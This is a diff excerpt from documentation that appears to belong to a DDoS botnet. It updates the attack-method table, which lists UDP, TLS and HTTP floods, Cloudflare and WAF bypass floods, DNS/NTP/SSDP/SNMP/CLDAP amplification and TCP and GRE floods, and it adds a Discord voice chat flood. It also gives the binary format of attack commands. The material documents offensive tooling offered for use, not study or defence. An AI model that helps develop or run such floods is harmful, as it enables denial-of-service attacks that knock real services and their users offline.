@@ -154,7 +154,7 @@ TTL max: 5 hops (prevents infinite loops)
 [AttackID:1][TargetCount:1][IP:4][Netmask:1][OptionsCount:1][Options...][Duration:4 LE]
 ```
 
-### Attack Methods (24 Total)
+### Attack Methods (25 Total)
 | ID | Name | Description |
 |----|------|-------------|
 | 0 | `udp` | UDP flood |
@@ -162,12 +162,13 @@ TTL max: 5 hops (prevents infinite loops)
 | 2 | `fivem` | FiveM protocol flood (getinfo/sec/token) |
 | 3 | `pps` | High PPS UDP flood |
 | 4 | `tls` | TLS/HTTPS flood |
-| 5 | `tlsplus` | Enhanced TLS flood |
+| 5 | `http` | Plain HTTP flood with rotating user agents |
 | 6 | `cf` | Cloudflare bypass flood |
 | 7 | `axis-l7` | Advanced L7 with WAF bypasses |
 | 8-12 | `*-amp` | DNS/NTP/SSDP/SNMP/CLDAP amplification |
 | 13-20 | `syn`-`window` | TCP floods |
 | 21-23 | `icmp`/`greip`/`greeth` | Special |
+| 30 | `discord` | Discord voice chat flood |
 
 ### Proxy Configuration
 Proxy lists are stored in `proxies/` directory:
